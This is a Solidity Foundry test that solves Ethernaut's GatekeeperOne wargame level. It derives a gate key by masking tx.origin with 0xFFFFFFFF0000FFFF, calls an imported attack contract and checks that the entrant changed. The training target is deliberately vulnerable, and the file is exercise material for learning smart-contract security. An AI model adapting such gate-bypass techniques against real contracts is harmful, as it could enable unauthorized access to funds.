// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/13-GatekeeperOne/GatekeeperOneFactory.sol";
import "src/levels/13-GatekeeperOne/AttackGatekeeperOne.sol";

contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testGatekeeperOneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // it could be 0xFFFFFFFF0000FFFF, 0xFFFF00000000FFFF, 0x0000FFFF0000FFFF;
        emit log_named_address("entrant address before exploit", ethernautGatekeeperOne.entrant());
        AttackGatekeeperOne attacker = new AttackGatekeeperOne(ethernautGatekeeperOne);
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        attacker.attack(gateKey);
        emit log_named_address("entrant address after exploit", ethernautGatekeeperOne.entrant());
        assertEq(ethernautGatekeeperOne.entrant(), tx.origin, "entrant address is not equal to tx.origin");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
